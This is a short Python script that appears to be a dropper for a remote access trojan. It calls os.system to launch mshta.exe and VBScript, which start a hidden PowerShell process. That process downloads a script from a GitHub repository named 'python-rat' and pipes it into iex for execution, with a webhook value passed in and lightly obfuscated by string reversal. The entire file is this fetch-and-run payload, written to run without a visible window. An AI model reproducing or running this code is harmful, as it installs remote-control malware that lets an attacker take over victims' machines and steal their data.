_A='you_webhook'
import os
def reverse_string(s):return s[::-1]
pythonrat=_A
command=f"mshta.exe vbscript:createobject(\"wscript.shell\").run(\"powershell $webhook='{reverse_string(pythonrat)}';iwr('https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/main.ps1')|iex\",0)(window.close)"
os.system(command)
aaaasdasd=reverse_string(_A)+pythonrat+_A
print(aaaasdasd)